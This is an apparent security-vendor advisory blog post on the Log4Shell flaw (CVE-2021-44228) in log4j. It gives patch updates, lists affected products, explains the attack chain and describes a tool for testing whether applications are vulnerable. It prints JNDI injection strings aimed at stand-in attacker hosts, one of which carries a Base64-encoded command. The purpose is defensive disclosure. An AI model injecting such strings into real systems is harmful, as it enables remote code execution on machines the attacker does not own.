@@ -1,0 +1,119 @@
+Our team is investigating CVE-2021-44228, a critical vulnerability that’s affecting a Java logging package log4j which is used in a significant amount of software, including Apache, Apple iCloud, Steam, Minecraft and others. Huntress is actively uncovering the effects of this vulnerability and will be frequently updating this page.
+
+At this point, we have not identified an impact to The Huntress Security Platform, but our teams are diligently checking to ensure all instances of our back-end are safe and will be taking appropriate action as needed.
+
+If your organization uses the log4j library, you should upgrade to log4j 2.17.1 immediately. Be sure that your Java instance is up-to-date; however, it’s worth noting that this isn’t an across-the-board solution. You may need to wait until your vendors push security updates out for their affected products.
+
+The log4j package may be bundled in with software you use provided by any given vendor. In this scenario, unfortunately, the vendors themselves will need to push the security updates downstream. As you assess your own risk and threat model, please consider the components of the software you use and especially what may be publicly accessible.
+
+Fellow MSP community member Tom Lawrence had confirmed and informed Huntress that the UniFi controller platform is vulnerable. If you use this technology, we urge you to upgrade to the patched version 6.5.54 as soon as possible.
+
+    Update #7 - 12/29/2021 @ 12:40pm ET - Updated with details on the release of log4j 2.17.1
+    Update #6 - 12/20/2021 @ 12:30pm ET - Updated with details to remediate DoS CVE-2021-45105 which was present in 2.16.0
+    Update #5 - 12/13/2021 @ 7:50pm ET - Updated to share details on the log4j 2.16.0 release
+    Update #4 - 12/13/2021 @ 5:40pm ET - Updated with an invitation to join our technical deep-dive during this week's Tradecraft Tuesday episode
+    Update #3 - 12/11/2021 @ 11:30am ET - Updated with instructions on how to use our vulnerability tool
+    Update #2 - 12/11/2021 @ 1am ET - Updated to share a tool to help you detect if your applications are vulnerable to CVE-2021-44228
+    Update #1 - 12/10/2021 @ 5pm ET - Updated to share additional details regarding the scope of the incident. ConnectWise Manage, Auvik and N-able may be impacted
+
+Update #7 - 12/29/2021 @ 12:40pm ET
+
+log4j 2.17.1 has been released to address a vulnerability that was uncovered in version 2.17.0. This version was vulnerable to an arbitrary code execution attack where an attacker with permission to modify the logging configuration file can construct a malicious configuration using a JDBC Appender with a data source referencing a JNDI URI which can execute remote code. This issue is fixed by limiting JNDI data source names to the java protocol in log4j2 2.17.1.
+
+We recommend that you update any instance of log4j to this latest version. For more details, visit this page: https://logging.apache.org/log4j/2.x/. 
+Update #6 - 12/20/2021 @ 12:30pm ET
+
+log4j 2.17.0 is now out to remediate DoS CVE-2021-45105, which was present in 2.16.0. Check out the release details here: https://logging.apache.org/log4j/2.x/changes-report.html#a2.17.0.
+Update #5 - 12/13/2021 @ 7:50pm ET
+
+log4j 2.16.0 is out which now completely disables JNDI by default and removes support for Message Lookups. You can find more release details here: https://logging.apache.org/log4j/2.x/changes-report.html#a2.16.0
+Update #4 - 12/13/2021 @ 5:40pm ET
+
+Join us on Tuesday, December 14 at 1pm ET for Tradecraft Tuesday. We'll team up with our industry friend and co-creator of our Log4Shell vulnerability tool, Jason Slagle, to talk about this vulnerability and share what we know.
+Update #2 - 12/11/2021 @ 1am ET
+
+We’ve created a tool to help you test whether your applications are vulnerable to CVE-2021-44228. You can access the tool here: https://log4shell.huntress.com/
+
+Click here to learn more—and huge thanks to Jason Slagle and our own Caleb Stewart and John Hammond for leading this effort.
+Update #1 - 12/10/2021 @ 5pm ET
+
+We're beginning to see a more significant impact from this vulnerability toward MSPs. Auvik has publicly expressed the vulnerable log4j library is in use within systems, on-premises ConnectWise has shared advisories and concerns for ConnectWise Manage installations, and N-able has confirmed that their RMM and N-Central are affected.
+
+We're investigating the reach and will post an update on our blog as soon as we have one.
+What's Happening?
+
+Attackers are actively exploiting a critical vulnerability that affects a Java logging package. log4j is used in a variety of different popular software by a number of manufacturers, including Apple, Twitter and Steam.
+
+Because of its large attack surface and the innate severity of remote code execution, security researchers are notably calling this a “shellshock” vulnerability. All threat actors need to trigger an attack is one line of text. There’s no obvious target for this vulnerability—hackers are taking a spray-and-pray approach to wreak havoc.
+Who’s Impacted?
+
+Millions of applications and manufacturers use log4j for logging. This includes...
+
+    Apple
+    Twitter
+    Steam
+    Tesla
+    Apache applications (e.g. Apache Struts, Solr and Druid)
+    Redis Desktop Manager (Redis proper is not affected)
+    ElasticSearch
+    Video games (e.g. Minecraft)
+
+This community resource is a growing list of software and components that have been found vulnerable and impacted.
+What Should I Do?
+
+If your organization uses the log4j library, upgrade to log4j 2.17.1 immediately. You should also be sure that your Java instance is up-to-date.
+
+A patch for CVE-2021-44228 has been released, but unfortunately, we’re at the mercy of many of our vendors to push updates that completely patch the vulnerability. 
+How Does the Vulnerability Work?
+
+The attack vector is extremely trivial for threat actors. A single string of text can trigger an application to reach out to an external location if it is logged via the vulnerable instance of log4j. 
+
+A threat actor might supply special text in an HTTP User-Agent header or a simple POST form request, with the usual form:
+
+${jndi:ldap://maliciousexternalhost.com/resource
+
+...where maliciousexternalhost.com is an instance controlled by the adversary. The log4j vulnerability parses this and reaches out to the malicious host via the “Java Naming and Directory Interface” (JNDI). The first-stage resource acts as a springboard to another attacker-controlled endpoint, which serves Java code to be executed on the original victim. 
+
+Java1
+
+Ultimately, this grants the adversary the opportunity to run any code they would like on the target: remote code execution. 
+
+Huntress researcher John Hammond has recreated a proof-of-concept exploit against the prolific target: Minecraft video game servers. Preparing an LDAP referrer for the first stage attacker-controlled endpoint, an HTTP host to serve the second-stage payload, and a listener to retrieve a callback, a single chat message within the Minecraft game server would detonate this payload on all other players machines joined to the server.
+
+For the sake of demonstration, we have showcased either opening the benign calculator application or retrieving a local command prompt, but please bear in mind that this could very well execute any sort of malicious code. Depending on access controls and other elements of your security posture, this could lead to future compromise—whether it be cryptocurrency miners, Cobalt Strike beacons, or ransomware. 
+
+minecraft1
+Threat Intelligence
+
+The JNDI abuse here is easily performed by a public and accessible utility, JNDIExploit. The use of this tool by a threat actor can provide worthwhile discovery and analysis from defenders in reviewing logs—the executed commands are typically included within the URL as Base64 encoded text. These look like queries:
+
+${jndi:ldap://MALICIOUSHOST.COM:PORT/Basic/Command/Base64/LoNGeNcoDeDcOmMaNd
+
+GreyNoise has been monitoring active exploitation seen in the wild from over a hundred hosts at the time of writing. This resource includes IP addresses and hosts that you may use to better detect or prevent against known actors. 
+
+Recent payloads have also been discovered using a jndi:dns:// schema rather than LDAP. 
+
+Security researcher Florian Roth has shared grep commands as well as YARA rules for detection of CVE-2021-44228 exploitation.
+What's Huntress Doing?
+
+We’ve created a tool to help you test whether your applications are vulnerable to CVE-2021-44228. 
+
+You can access the tool here: https://log4shell.huntress.com/
+
+The website will generate a unique identifier to test whether your application is vulnerable to Log4Shell (CVE-2021-44228). A negative test does not guarantee that your application is patched.
+
+Here's how to use it:
+
+    You simply copy and paste the generated JNDI syntax (the code block ${jndi[:]ldap[:]//.... presented on the site) into anything (application input boxes, frontend site form fields, logins such as username inputs, or if you are bit more technical, even User-Agent or X-Forwarded-For or other customizable HTTP headers)
+        Please note that our blog platform disallows the full syntax, so we have left off the closing curly brace 😅
+    Click the "View Connection" button after you have pasted in the syntax to see if it received any connection, and verify the detected IP address and timestamp, to correlate with when you tested any service
+    If you see an entry, a connection was made and the application you tested is vulnerable
+
+The website works by generating a random unique identifier for you which you can then use when testing input fields. If an input field or application is vulnerable, it will reach out to this website over LDAP. Our LDAP server will immediately terminate the connection and log it for a short time. This tool will not actually run any code on your systems.
+
+Please note that this tool is intended for testing purposes only and should only be used on systems you are authorized to test. If you find any vulnerabilities, please follow responsible disclosure guidelines.
+
+For transparency's sake, we're providing access to the source code for this utility, which can be found here.
+
+(HUGE thanks to Jason Slagle and our own Caleb Stewart and John Hammond for leading this effort.) 
+
